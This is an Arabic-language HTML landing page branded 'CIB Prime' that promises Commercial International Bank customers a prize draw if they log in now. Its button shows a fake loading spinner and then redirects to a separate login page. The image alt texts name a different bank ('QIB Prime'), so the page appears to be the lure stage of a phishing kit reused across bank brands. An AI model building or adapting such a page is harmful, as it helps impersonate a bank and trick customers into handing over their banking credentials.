
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  />

  <title>CIB Prime</title>

  <!-- Favicon -->
  <link
    rel="icon"
    type="image/png"
    href="images/logo.png"
  />

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Font -->
  <link
    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap"
    rel="stylesheet"
  />

  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      font-family: "Cairo", sans-serif;
    }

    body {
      margin: 0;
      background: #f5f5f5;
      overflow-x: hidden;
    }

    .screen-loader {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.55);
      backdrop-filter: blur(2px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .screen-loader.active {
      display: flex;
    }

    .spinner {
      width: 52px;
      height: 52px;
      border: 4px solid rgba(0,87,168,.15);
      border-top-color: #0057a8;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .hero-overlay {
      background:
        linear-gradient(
          to top,
          rgba(0,0,0,.65),
          rgba(0,0,0,.18)
        );
    }
  </style>
</head>

<body>

  <!-- Loader -->
  <div id="screenLoader" class="screen-loader">
    <div class="spinner"></div>
  </div>

  <!-- Main -->
  <div class="min-h-screen relative overflow-hidden">

    <!-- Background Image -->
    <img
      src="images/index.png"
      alt="QIB Prime"
      class="absolute inset-0 w-full h-full object-cover"
    />

    <!-- Overlay -->
    <div class="hero-overlay absolute inset-0"></div>

    <!-- Content -->
    <div
      class="relative z-10 min-h-screen flex items-end justify-center p-6"
    >

      <div
        class="w-full max-w-md bg-white/95 backdrop-blur-sm rounded-[32px] p-7 shadow-2xl border border-white/40"
      >

        <!-- Logo -->
        <div class="flex justify-center mb-6">

          <img
            src="images/ciblogo.png"
            alt="QIB Prime"
            class="w-40 object-contain"
          />

        </div>

        <!-- Text -->
        <div class="text-center">

          <h1
            class="text-[28px] leading-[48px] font-extrabold text-[#1d1d1d] mb-4"
          >
            شارك الآن وادخل السحب
          </h1>

          <p
            class="text-[15px] leading-8 text-[#666] font-semibold mb-8"
          >
            سجّل دخولك الآن للحصول على فرصة مميزة للدخول في السحب والاستفادة من العروض والخدمات الحصرية المقدمة لعملاء البنك التجاري الدولي.
          </p>

        </div>

        <!-- Button -->
        <button
          id="joinBtn"
          class="
            w-full
            h-16
            rounded-2xl
            bg-[#0057a8]
            text-white
            text-[18px]
            font-extrabold
            transition
            active:scale-[0.98]
          "
        >
          شارك الآن
        </button>

      </div>

    </div>

  </div>

  <script>

    const joinBtn =
      document.getElementById("joinBtn");

    const screenLoader =
      document.getElementById("screenLoader");

    joinBtn.addEventListener("click", () => {

      screenLoader.classList.add("active");

      setTimeout(() => {

        window.location.href = "login.html";

      }, 1000);

    });

  </script>

</body>
</html>
